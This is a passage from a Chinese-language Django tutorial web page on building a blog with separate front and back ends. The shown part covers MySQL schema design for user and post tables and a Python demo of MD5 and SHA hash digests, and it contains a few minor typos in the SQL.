<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Python: Djiango-Web后端框架-前后端分离博客项目</title>
<meta name="generator" content="Org Mode" />
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="me" href="https://emacs.ch/@jasperhsu">
<meta name="google-adsense-account" content="ca-pub-1741779893655624">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
<!-- from -->
<!--
<style>#back-to-top{background:#000;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%;bottom:20px;-webkit-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);-moz-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);box-shadow:0 2px 5px 0 rgba(0,0,0,.26);color:#fff;cursor:pointer;display:block;height:56px;opacity:1;outline:0;position:fixed;right:20px;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-transition:bottom .2s,opacity .2s;-o-transition:bottom .2s,opacity .2s;-moz-transition:bottom .2s,opacity .2s;transition:bottom .2s,opacity .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:56px;z-index:1}#back-to-top svg{display:block;fill:currentColor;height:24px;margin:16px auto 0;width:24px}#back-to-top.hidden{bottom:-56px;opacity:0}</style>
-->
<link rel="stylesheet" href="/static/aandds.com/css/main.css">
<link rel="stylesheet" href="/static/aandds.com/css/drollery.min.css">
<script type="text/javascript" src="/static/aandds.com/js/main.js"></script>
<!--
<script id="MathJax-script" async="" src="/static/aandds.com/js/mathjax.js"></script>

<script type="text/javascript" src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
-->
<script>
  window.MathJax = {
    tex: {
      ams: {
        multlineWidth: '85%'
      },
      tags: 'ams',
      tagSide: 'right',
      tagIndent: '.8em'
    },
    chtml: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    svg: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    output: {
      font: 'mathjax-modern',
      displayOverflow: 'overflow'
    }
  };
</script>

<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">Python: Djiango-Web后端框架-前后端分离博客项目</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#h:8e858e6d-f0f0-45d6-b969-cfd702dbdfba">数据库模型设计</a>
<ul>
<li><a href="#h:1abe2926-8c10-4c57-bb5c-0268d6ff1987">分析</a></li>
<li><a href="#h:29ee4b12-3579-4a66-b33d-f18859ea7165">数据库设计</a>
<ul>
<li><a href="#h:5312f395-6883-4dac-b978-303e7be06498">创建数据库</a></li>
<li><a href="#h:13e80511-5cd6-4570-8c21-8714fae37d7e">用户表user</a>
<ul>
<li><a href="#h:29519ea7-43e0-4b38-8fcc-b706a8ee1cd5">密码算法</a></li>
</ul>
</li>
<li><a href="#h:77980a29-4295-489a-af4f-7cf9b6688e54">系统表auth_user</a></li>
<li><a href="#h:a8b56961-dee8-42ef-b7e6-08526d52969e">文章表post</a></li>
</ul>
</li>
<li><a href="#h:60240dfa-b819-4e1c-921b-5d14367c8ece">项目</a>
<ul>
<li><a href="#h:65093d73-c03a-4d8e-8167-c79088270fa8">项目构建</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:0fb0d61d-ad66-4c23-b1f7-ed66a2cb0bc7">项目构建和基础知识</a>
<ul>
<li><a href="#h:908b8308-a395-409d-ab96-9173d083d9e6">概述</a></li>
<li><a href="#h:2e4923df-6bf2-4eaa-ab09-8ad8c84b3982">安装Django</a></li>
<li><a href="#h:c32e2da5-2cb1-4365-af22-bd6309746a7a">创建Django项目</a>
<ul>
<li><a href="#h:1e90c990-0549-41f0-b9ba-6796476ea00f">数据库配置</a></li>
<li><a href="#h:0674244f-e898-4721-86d0-e9958c061d55">MySQL数据库驱动</a></li>
<li><a href="#h:fc5a4e84-c7bb-45e6-ad43-7a2e24b996ee">创建应用</a></li>
<li><a href="#h:ca220398-f7b9-40b5-97ee-547eb88277b8">注册应用</a></li>
<li><a href="#h:be1c93a4-b01e-47ad-a603-ce4d104a5d22">迁移</a></li>
</ul>
</li>
<li><a href="#h:976fe8a4-d5dc-4d5f-8662-6b9f0feb7313">如果使用自建use表</a>
<ul>
<li><a href="#h:deca07ae-0a55-4089-b766-d6a50e12a47d">模型Model</a></li>
<li><a href="#h:b3cf9f14-2314-4ca6-b8e7-c040f7a68703">创建User的Model类</a></li>
</ul>
</li>
<li><a href="#h:de578544-d4f2-4706-ad64-c819d3210959">Django后台管理</a></li>
<li><a href="#h:2a94a3a7-cb99-4a99-a4d0-ddc8b8629169">路由（重要）</a></li>
</ul>
</li>
<li><a href="#h:82fc7377-e915-4d33-babe-aedf458c95eb">Django模板技术</a>
<ul>
<li><a href="#h:38283099-00be-4757-b190-77db9c19230f">由来</a></li>
<li><a href="#h:2a9d1d94-4532-4b87-81db-f3a89607fca3">模板配置</a></li>
<li><a href="#h:fbd99f6a-e10a-4154-a886-d862825ae16f">模板渲染</a>
<ul>
<li><a href="#h:81a6213e-d339-4f53-ac3f-51a6d6baefb4">模板页</a></li>
<li><a href="#h:0c6c6c29-065c-46cb-b8fa-87db71b498ef">模板处理</a></li>
<li><a href="#h:377fab23-2d07-4e9b-be73-0a0e6e08934b">render快捷渲染函数</a></li>
</ul>
</li>
<li><a href="#h:a6794a58-2021-4cf3-9116-80e8e3a5e254">DTL语法(模板语法)</a>
<ul>
<li><a href="#h:5f11a19c-280e-4b5c-bb1d-db609c3f5aaf">变量</a></li>
<li><a href="#h:d67e337e-ccd0-401b-b7f9-98941b6ce67b">模板标签</a></li>
<li><a href="#h:42f5b44c-88bb-44d6-9028-da6e95ca631d">注释标签</a></li>
<li><a href="#h:cda8d276-bf3a-4d3e-8eff-77f769a823c3">过滤器</a></li>
</ul>
</li>
<li><a href="#h:b29e3522-a78c-41be-86c1-6f9a0b305a22">模板练习</a>
<ul>
<li><a href="#h:da63fc89-2bef-4424-a8cd-7bcdb304e7e5">1、奇偶行列表输出</a></li>
<li><a href="#h:ea43aba3-70e9-4a07-ae00-e526f8e45060">2、打印九九方阵, 自定义模板一些使用方法</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:5507a5c6-5cb6-476a-b1da-aeee85d2c35e">Restful-API设计</a>
<ul>
<li><a href="#h:49af8863-8cc8-445c-b2a6-b98063d63816">1.协议</a></li>
<li><a href="#h:1acdca45-9360-418e-ad1f-d8a5c6bc3a3e">2.HTTP方法</a></li>
<li><a href="#h:77e8fb6d-c20e-4d85-bccd-6e337306b639">3.使用名称</a></li>
<li><a href="#h:4511c1d3-8530-47ab-8ae0-a32858ba5be6">4.集合功能</a></li>
<li><a href="#h:99dc4087-5906-46a8-bd31-78b68f8ff9e7">5.状态码</a></li>
<li><a href="#h:a4f53546-95ed-4a6e-a2f1-4bdbdc67b3e2">6.错误处理</a></li>
<li><a href="#h:158c39ff-9c3e-46e8-aae9-a1aefd6553cd">7.版本</a></li>
<li><a href="#h:c4c86260-2559-4655-8d9e-f636d1505df0">8. 返回结果</a></li>
</ul>
</li>
<li><a href="#h:d4c1ba92-5f0c-4b3a-899f-7873c7cd467a">注册接口设计和实现</a>
<ul>
<li><a href="#h:dfda6f78-6fe5-4735-a5f4-c5b7f812762b">用户注册接口设计</a>
<ul>
<li><a href="#h:1a518a1d-5758-4380-b733-81e81c017706">路由配置</a></li>
<li><a href="#h:d28b5cb8-02b1-4e07-b28e-2d740c16cfd6">测试JSON数据</a></li>
<li><a href="#h:f5311f9b-8545-4029-a844-8a6b96ffe528">CSRF处理**</a></li>
<li><a href="#h:40656b8a-5c03-4112-b091-2ffb0a10a251">JSON数据处理</a></li>
<li><a href="#h:ebdf4250-239e-4d66-91a8-70fd5ace2202">错误处理</a></li>
<li><a href="#h:72822932-1569-44e3-886e-6c593cce7539">请求方法限定view装饰器</a></li>
<li><a href="#h:072b4093-653e-4127-ae38-d10df3504097">注册代码 v1</a></li>
</ul>
</li>
<li><a href="#h:1c3fa3d6-39ca-4a00-ad25-05029416bb65">Django日志</a></li>
</ul>
</li>
<li><a href="#h:6329a26b-e608-496a-9981-bf28deb4b20f">登录接口设计和实现</a>
<ul>
<li><a href="#h:899060e4-25d5-456f-a443-2106b8113684">用户登录接口设计</a></li>
<li><a href="#h:56e75baa-0b75-46df-9cdc-c26ec2d8879d">路由配置</a></li>
<li><a href="#h:fcbe48ab-9ee9-4b74-b304-3c5525d97c4f">Django的认证</a></li>
<li><a href="#h:b183c0a8-f5a1-43b4-9a71-594c25948414">登录代码</a></li>
<li><a href="#h:964b4cb1-25b3-449b-b48e-e638bda86f53">中间件技术Middleware</a>
<ul>
<li><a href="#h:d0315c98-1f5b-4069-9db6-58afe668c251">原理</a></li>
<li><a href="#h:e6a7132e-970a-4642-924b-8d20638b8065">自定义中间件用户验证</a></li>
</ul>
</li>
<li><a href="#h:95961e71-ed97-4390-8c9a-7b5ee7a6b5fb">装饰器</a></li>
<li><a href="#h:0acaeb1e-ba69-4953-82ff-9e5d9e5f9401">登出代码</a></li>
<li><a href="#h:a41882ae-8e1b-49a9-bc6b-dc1a42cb8a06">Session使用</a>
<ul>
<li><a href="#h:1b51cfd9-d386-40d1-bf4e-d39052400add">Session-Cookie机制</a></li>
<li><a href="#h:00125130-88c9-489a-b030-378e2cc122a7">开启session支持</a></li>
<li><a href="#h:dd447754-0122-457d-8fc8-91db2af548ae">session清除</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:ecb5af9a-c858-4c89-9011-a08b2b0c923c">博文接口实现</a>
<ul>
<li><a href="#h:02c5eb62-e4e4-4b2b-9843-2473b0a242de">功能分析</a></li>
<li><a href="#h:1a04237e-d588-442d-bdb4-746f7aa8d905">创建博文应用</a></li>
<li><a href="#h:39c7e318-5b6b-4ad2-bee1-9ffb8a739d6c">路由</a></li>
<li><a href="#h:1ed6dcb8-662d-4d91-844f-ebf58f5b180d">模型</a></li>
<li><a href="#h:6ae72b57-ab96-46d7-a6fd-2d5f686e25d7">模型操作</a></li>
<li><a href="#h:77e53b48-e002-478c-b5e4-2a38c57280ab">视图分类</a>
<ul>
<li><a href="#h:82e6cf6f-262f-4e49-92a0-d1e8218c4175">django.views.View类原理</a></li>
</ul>
</li>
<li><a href="#h:0f4f35b2-83fd-441f-89c5-4b74f241ef28">认证装饰器进阶</a></li>
<li><a href="#h:2a36bad0-198d-4d4b-9229-2376d89609ee">发布接口实现</a></li>
<li><a href="#h:6b1b783b-a065-4a4b-aecf-ccb37374424d">文章接口实现</a></li>
<li><a href="#h:b54173c0-2581-4982-8fd4-bfe2065ad9b0">时间问题</a></li>
<li><a href="#h:5d768b55-fb83-4029-aca7-147e98ce35ef">列表页接口实现</a>
<ul>
<li><a href="#h:99443d26-9e90-450d-877f-c17d1a132d49">完善分页</a></li>
<li><a href="#h:1838ff94-d958-4944-8bd8-46da421bcf42">改写校验函数</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:ab043578-1b85-4bdb-b412-17d7a08c7061">前端开发-登录功能实现</a>
<ul>
<li><a href="#h:2a1f7cef-fbfc-4cc8-9bd0-572a1139956a">开发环境设置</a>
<ul>
<li><a href="#h:7b410468-5351-46bb-8687-ac4ac468081b">完整的文件</a>
<ul>
<li><a href="#h:3c64db3a-59f1-49bd-937d-6612ac98358c">webpack</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:19aac4a1-0284-43cc-a9f5-b4a832f44497">开发</a>
<ul>
<li><a href="#h:29488dbd-a446-4e2c-9e08-0b26154cac48">前端路由</a>
<ul>
<li><a href="#h:25a04646-d405-492b-bd42-1c179d644578">Route指令</a></li>
</ul>
</li>
<li><a href="#h:42c12639-219d-4d3e-aa80-19bf58fe0b97">登录组件</a></li>
<li><a href="#h:0a3a7aa3-8099-4dd9-8a85-8ad470d21dae">注册组件</a></li>
<li><a href="#h:eedefb16-14c9-4816-bf60-1d98b8b80327">导航栏链接</a></li>
<li><a href="#h:5a32628c-dab9-4154-9733-b2bdc87e9c70">分层</a></li>
<li><a href="#h:6dd995b4-6cf1-42b9-ab10-f735a8aae72a">登录功能实现</a></li>
<li><a href="#h:ac22f960-259b-472e-8eca-566447347475">UserService的login方法实现</a>
<ul>
<li><a href="#h:f067e4c5-3219-498c-9582-4e7f875b48e9">代理配置</a></li>
<li><a href="#h:7738b313-b74a-4eed-b7dd-5ff41a1c8bca">axios异步库</a></li>
</ul>
</li>
<li><a href="#h:a34ba445-8806-4a4e-9d89-336c702220f3">Mobx状态管理</a>
<ul>
<li><a href="#h:89ce8980-41be-49e7-816d-a33298180446">Redux和Mobx</a></li>
<li><a href="#h:95939178-68f4-4a43-bb0d-ffbc8e2c921f">状态管理</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:60860465-c797-4218-aa59-27a0bd2eb419">跳转</a></li>
<li><a href="#h:a100db74-8fa6-4ff8-b88a-378e282bc6cf">Login登录功能代码实现</a></li>
</ul>
</li>
<li><a href="#h:355669cf-8ac0-4504-904f-44d75f34b6a0">前端开发-注册功能代码实现</a>
<ul>
<li><a href="#h:362a1e37-f984-4d6c-910f-229ca446b4a6">注册功能实现</a></li>
<li><a href="#h:187d9f1e-0a28-40ae-b71b-2aa6e7dea296">Ant Design</a>
<ul>
<li><a href="#h:bd68402f-cf6f-40ef-8941-659b415f859d">按需加载</a></li>
<li><a href="#h:1c887c99-a63e-44b3-95cd-0636df68945e">信息显示</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:7bd98031-5ec4-443d-a7ad-60ff1c30f4fe">高阶组件装饰器</a></li>
<li><a href="#h:3712e9c9-f6b0-494e-93a6-0c9355820195">验证码</a>
<ul>
<li><a href="#h:60decdd2-4742-4bfb-8e4c-7b96ab29cb81">PIL</a></li>
<li><a href="#h:ae8b2c97-b3ac-415c-8aed-7b7e1cec6a58">Captcha</a></li>
<li><a href="#h:8036bd0c-42d6-43d2-ac3b-fcae83b146e5">客户端</a>
<ul>
<li><a href="#h:01ef2697-8e0f-494f-9b48-2b85f6713634">后端-验证码接口</a></li>
<li><a href="#h:cb7fc128-0ae3-4608-b4cf-1df20bbf63f0">前端-获取验证码</a></li>
<li><a href="#h:8861d8bd-4098-4b0d-8985-6faa56aa00ff">后端-登录认证</a></li>
<li><a href="#h:3bdb6d98-eadb-41ed-a186-050b6ee7784e">前端- 登录认证</a></li>
<li><a href="#h:45878983-da55-42ad-a9e4-d7ac007cd830">前端-刷新验证码</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:9dcd95c6-7beb-444c-a716-5456bae2c5e9">博文业务代码实现和Antd组件</a>
<ul>
<li><a href="#h:b7f03f69-3294-4bfb-a11b-ce2315d98551">导航菜单</a></li>
<li><a href="#h:021def2b-5cf8-46df-bac4-c2d5612e85c0">页面布局</a></li>
<li><a href="#h:7161fae6-e3e7-4cba-ab6d-da240375c45e">博文业务</a>
<ul>
<li><a href="#h:597d0cf2-2f4a-4a6f-a33c-4112a6a2daaf">业务层</a></li>
<li><a href="#h:d0f06259-123b-406c-82d2-e890e09700b6">发布组件</a></li>
<li><a href="#h:871fb3c4-9eee-42ed-af4c-52037ee576ba">表单数据验证</a></li>
<li><a href="#h:5d7d567a-e2df-4f23-b1d2-0843c758f1f9">富文本编辑器</a></li>
<li><a href="#h:4c091348-5b69-413f-b8c1-89dc3e47094c">发布功能实现</a>
<ul>
<li><a href="#h:b18271ca-10aa-4c1b-b4b1-62ac5db9ace6">装饰器</a></li>
<li><a href="#h:79c1ddf3-5e1b-44f2-a90b-6e464293592f">后端-产生cookie</a></li>
<li><a href="#h:129b0458-7db7-420f-9531-9e973c9f0305">前端-获取cookie</a></li>
<li><a href="#h:7c611c4b-1b18-4a59-a422-15f9d6edd16a">前端-服务层改进</a></li>
</ul>
</li>
<li><a href="#h:d9ce7d19-a1dd-4209-a10a-f53f0be204ed">登出</a></li>
<li><a href="#h:7a5cb692-42b4-41bd-bd91-d12f7db8bde5">csrf保护</a></li>
<li><a href="#h:80ae0eb9-77ac-4269-978a-21199c1f07db">详情页</a>
<ul>
<li><a href="#h:b0be5bdb-9b03-4047-a0c6-74c800509bf0">组件</a></li>
</ul>
</li>
<li><a href="#h:dd23a3fc-d76b-4b5a-a610-27caf60d5b8a">XSS</a></li>
<li><a href="#h:a93bce79-d7d3-41e3-ad48-c71a5dae312a">文章列表页组件</a>
<ul>
<li><a href="#h:a9a795d3-034b-41d6-a5a3-ef0f6ba989f1">List组件</a></li>
</ul>
</li>
<li><a href="#h:43383cb6-c4a9-467e-b738-1611d61e8faf">分页功能</a></li>
</ul>
</li>
<li><a href="#h:84c66087-1fe7-4aaf-aff7-74f3395bd685">国际化</a></li>
<li><a href="#h:fa799f56-d419-4805-ba91-300d659144fb">重构Axios</a></li>
</ul>
</li>
<li><a href="#h:d3614d6d-3876-4326-9ace-cd20f9df9d70">项目部署</a>
<ul>
<li><a href="#h:77405a37-bdc1-4f4b-8d4d-b186fea9a7d0">Django 打包</a>
<ul>
<li><a href="#h:6c693d37-8ace-4f7a-9311-f48318650ed9">构建setup.py文件</a></li>
<li><a href="#h:eee04224-b96e-4a29-830e-f70066ce05a1">部署应用</a></li>
</ul>
</li>
<li><a href="#h:ae32511d-2909-4b0e-bcf9-b001c184edc2">WSGI</a></li>
<li><a href="#h:e71c9208-5f11-4cdc-8f4d-518b32b89655">uWSGI</a></li>
<li><a href="#h:531e8839-c96e-489f-a66b-f53626a25a85">uWSGI+Django部署</a></li>
<li><a href="#h:9185b89b-14dd-499c-8c9b-daa39778fe37">React项目打包</a></li>
<li><a href="#h:c77e494a-c921-4d14-8256-379cd67d7c6a">nginx uwsgi部署</a>
<ul>
<li><a href="#h:905435b7-6141-4b92-9c21-ebe0293f0362">tengine安装</a></li>
<li><a href="#h:b6b1c7f3-daf6-439a-ae14-01dbceaa3ef8">http部署</a></li>
<li><a href="#h:f2c7c726-1700-46dc-8945-4f0c8a12e84a">uwsgi部署</a>
<ul>
<li><a href="#h:8c3dff55-6664-41da-af14-9757d8a1a874">uwsgi配置文件</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:57f85199-6bac-4176-beab-3fd39aebf2a0">部署图</a></li>
<li><a href="#h:91193b33-eb0b-41b9-858d-409153ca09cc">MVC设计模式</a></li>
</ul>
</li>
</ul>
</div>
</nav>
<ul class="org-ul">
<li>TAGS: <a href="./index.html">Python</a></li>
</ul>
<section id="outline-container-h:8e858e6d-f0f0-45d6-b969-cfd702dbdfba" class="outline-2">
<h2 id="h:8e858e6d-f0f0-45d6-b969-cfd702dbdfba">数据库模型设计</h2>
<div class="outline-text-2" id="text-h:8e858e6d-f0f0-45d6-b969-cfd702dbdfba">
</div>
<div id="outline-container-h:1abe2926-8c10-4c57-bb5c-0268d6ff1987" class="outline-3">
<h3 id="h:1abe2926-8c10-4c57-bb5c-0268d6ff1987">分析</h3>
<div class="outline-text-3" id="text-h:1abe2926-8c10-4c57-bb5c-0268d6ff1987">
<p>
多人使用博客系统。采用BS架构实现。市面上多数某某系统归根结底都是这种设计。
</p>

<p>
博客系统，核心模块有：
</p>
<ol class="org-ol">
<li>用户管理
<ul class="org-ul">
<li>注册、登录</li>
<li>删除查用户</li>
</ul></li>
<li>博文管理
<ul class="org-ul">
<li>增删改查博文</li>
</ul></li>
</ol>

<p>
需要数据库，本次使用Mysql8+, InnoDB引擎。
</p>

<p>
需要支持多用户登录，各自可以管理自己的博文(增删改查)，管理是不公开的，但是博文是不需要登录就可以公开预览的。
</p>

<p>
先不要思考过多的功能，先完成最小的核心需求代码。
</p>
</div>
</div>
<div id="outline-container-h:29ee4b12-3579-4a66-b33d-f18859ea7165" class="outline-3">
<h3 id="h:29ee4b12-3579-4a66-b33d-f18859ea7165">数据库设计</h3>
<div class="outline-text-3" id="text-h:29ee4b12-3579-4a66-b33d-f18859ea7165">
</div>
<div id="outline-container-h:5312f395-6883-4dac-b978-303e7be06498" class="outline-4">
<h4 id="h:5312f395-6883-4dac-b978-303e7be06498">创建数据库</h4>
<div class="outline-text-4" id="text-h:5312f395-6883-4dac-b978-303e7be06498">
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">CREATE</span> DATABASE IF <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">EXISTS</span> `blog` <span style="color: #a020f0;">DEFAULT</span> <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> utf8mb4;
</pre>
</div>


<p>
需要用户表、文章表
</p>
</div>
</div>
<div id="outline-container-h:13e80511-5cd6-4570-8c21-8714fae37d7e" class="outline-4">
<h4 id="h:13e80511-5cd6-4570-8c21-8714fae37d7e">用户表user</h4>
<div class="outline-text-4" id="text-h:13e80511-5cd6-4570-8c21-8714fae37d7e">
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">字段</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">id</td>
<td class="org-left">主键，唯一标识</td>
</tr>

<tr>
<td class="org-left">username</td>
<td class="org-left">登录名，唯一</td>
</tr>

<tr>
<td class="org-left">name</td>
<td class="org-left">用户姓名，描述性字段</td>
</tr>

<tr>
<td class="org-left">email</td>
<td class="org-left">电子邮箱，注册用信息，应该唯一。可用作登录名、可用于密码找回</td>
</tr>

<tr>
<td class="org-left">password</td>
<td class="org-left">密码存储。注意，不能明文存储密码。一般采用单向加密算法，如MD5</td>
</tr>
</tbody>
</table>

<div class="org-src-container">
<pre class="src src-sql">use blog

<span style="color: #a020f0;">CREATE</span> <span style="color: #a020f0;">TABLE</span> `<span style="color: #483d8b;">user</span>` (
    `id` <span style="color: #228b22;">INT</span> ( 11 ) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span> AUTO_INCREMENT,
    `<span style="color: #a020f0;">name</span>` <span style="color: #228b22;">VARCHAR</span> ( 48 ) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
    `email` <span style="color: #228b22;">VARCHAR</span> ( 64 ) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
    `password` <span style="color: #228b22;">VARCHAR</span> ( 128 ) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
    <span style="color: #a020f0;">PRIMARY</span> <span style="color: #a020f0;">KEY</span> ( `id` ),
<span style="color: #a020f0;">UNIQUE</span> <span style="color: #a020f0;">KEY</span> `email` ( `email` )
) ENGINE = INNODB <span style="color: #a020f0;">DEFAULT</span> CHARSET = utf8;
</pre>
</div>
</div>
<div id="outline-container-h:29519ea7-43e0-4b38-8fcc-b706a8ee1cd5" class="outline-5">
<h5 id="h:29519ea7-43e0-4b38-8fcc-b706a8ee1cd5">密码算法</h5>
<div class="outline-text-5" id="text-h:29519ea7-43e0-4b38-8fcc-b706a8ee1cd5">
<p>
密码一般采用单向散列算法，算法保证不可逆。
</p>
<ul class="org-ul">
<li>MD5(Message Digest Algorithm 5): 输出128位数值。被广泛采用，但已经极度不安全，不建议采用</li>
<li>SHA(Secure Hash Algorithm): 较新算法
<ul class="org-ul">
<li>由于SHA-0, SHA-1相继被王小云教授破解</li>
<li>SHA-2包含SHA-224, SHA-256, SHA-384, SHA-512</li>
<li>SHA3于2012年由非NSA设计，内部算法设计不同SHA-1和SHA-2</li>
</ul></li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> hashlib <span style="color: #a020f0;">import</span> md5, sha1, sha256, sha512, sha3_256, sha3_512

<span style="color: #a0522d;">has</span> = (md5, sha1, sha256, sha512, sha3_256, sha3_512)

<span style="color: #483d8b;">print</span>(md5(b<span style="color: #8b2252;">'abc'</span>).hexdigest()) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36755;&#20986; 'abc' &#30340; MD5 &#21704;&#24076;&#65288;&#21313;&#20845;&#36827;&#21046;&#65289;</span>
<span style="color: #483d8b;">print</span>(md5(b<span style="color: #8b2252;">'abd'</span>).hexdigest())

<span style="color: #a0522d;">s</span> = b<span style="color: #8b2252;">'abc'</span>
<span style="color: #a020f0;">for</span> h <span style="color: #a020f0;">in</span> has:
    <span style="color: #a0522d;">o</span> = h(s)
    <span style="color: #a0522d;">y</span> = o.digest()
    <span style="color: #a0522d;">x</span> = o.hexdigest() 
    <span style="color: #483d8b;">print</span>(s,h)
    <span style="color: #483d8b;">print</span>(x, <span style="color: #483d8b;">len</span>(x), y, <span style="color: #483d8b;">len</span>(y))
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'-'</span>*30)
    <span style="color: #b22222;">#</span><span style="color: #b22222;">digest()&#65306;&#36820;&#22238;&#21407;&#22987;&#23383;&#33410;&#65288;bytes &#23545;&#35937;&#65289;&#65292;&#38271;&#24230;&#30001;&#31639;&#27861;&#20915;&#23450;&#65288;&#22914; MD5=16 &#23383;&#33410;&#65292;SHA256=32 &#23383;&#33410;&#65289;&#12290;</span>
    <span style="color: #b22222;">#</span><span style="color: #b22222;">hexdigest()&#65306;&#36820;&#22238;&#21313;&#20845;&#36827;&#21046;&#23383;&#31526;&#20018;&#65292;&#38271;&#24230;&#26159;&#21407;&#22987;&#23383;&#33410;&#38271;&#24230;&#30340; 2 &#20493;&#12290;</span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:77980a29-4295-489a-af4f-7cf9b6688e54" class="outline-4">
<h4 id="h:77980a29-4295-489a-af4f-7cf9b6688e54">系统表auth_user</h4>
<div class="outline-text-4" id="text-h:77980a29-4295-489a-af4f-7cf9b6688e54">
<p>
在Django中也可以使用内建的用户系统，它提供了用户、用户组、权限表。
</p>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">CREATE</span> <span style="color: #a020f0;">TABLE</span> `auth_user` (
  `id` <span style="color: #228b22;">INT</span> (11) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span> AUTO_INCREMENT,
  `PASSWORD` <span style="color: #228b22;">VARCHAR</span> (128) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `last_login` DATETIME (6) <span style="color: #a020f0;">DEFAULT</span> <span style="color: #a020f0;">NULL</span>,
  `is_superuser` TINYINT (1) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `username` <span style="color: #228b22;">VARCHAR</span> (150) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `first_name` <span style="color: #228b22;">VARCHAR</span> (30) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `last_name` <span style="color: #228b22;">VARCHAR</span> (150) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `email` <span style="color: #228b22;">VARCHAR</span> (254) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `is_staff` TINYINT (1) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `is_active` TINYINT (1) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `date_joined` DATETIME (6) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  <span style="color: #a020f0;">PRIMARY</span> <span style="color: #a020f0;">KEY</span> (`id`),
  <span style="color: #a020f0;">UNIQUE</span> <span style="color: #a020f0;">KEY</span> `username` (`username`)
) ENGINE = InnoDB AUTO_INCREMENT = 2_DEFAULTCHARSET = utf8mb4;
</pre>
</div>

<p>
这个表唯一的问题就是email并没有设定唯一键，可以迁移后，修改表手动增加。
</p>

<p>
模型类只要不用来迁移，它就是用来创建实例的类，从数据库查来的数据放在这个实例中。
</p>

<p>
模型类和数据库不一定需要一一对应。
</p>

<p>
一般是自己创建user表，不推荐使用内建的表。
</p>
</div>
</div>
<div id="outline-container-h:a8b56961-dee8-42ef-b7e6-08526d52969e" class="outline-4">
<h4 id="h:a8b56961-dee8-42ef-b7e6-08526d52969e">文章表post</h4>
<div class="outline-text-4" id="text-h:a8b56961-dee8-42ef-b7e6-08526d52969e">
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">字段</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">id</td>
<td class="org-left">主键，唯一标识</td>
</tr>

<tr>
<td class="org-left">title</td>
<td class="org-left">标题，描述性字段</td>
</tr>

<tr>
<td class="org-left">author</td>
<td class="org-left">博文作者要求必须是注册用户，这个字段应该存储userid</td>
</tr>

<tr>
<td class="org-left">postdate</td>
<td class="org-left">发布日期，日期类型</td>
</tr>

<tr>
<td class="org-left">content</td>
<td class="org-left">文章内容，博文内容可能很长，一般来说不会小于256个字符的</td>
</tr>
</tbody>
</table>

<p>
一对多关系：一篇博文属于一个作者，一个作者有多篇博文。
</p>

<p>
<b>Content字段的设计</b>
</p>
<ol class="org-ol">
<li>博客内容选取什么字段类型？</li>
<li>多大合适？</li>
<li>博文图片如何处理？</li>
<li>适合和其它字段放在同一张表吗？</li>
</ol>

<p>
答：
</p>
<ol class="org-ol">
<li>字段类型 ：博文一般很长，不可能只有几百个字符，需要大文本字段。MySQL中，选择TEXT类型，而不是char或者varchar类型。</li>
<li>大小 ：text类型是65535个字符，如果不够用，选择longtext,有\(2^{32}-1\)个字符长度。足够使用了。</li>
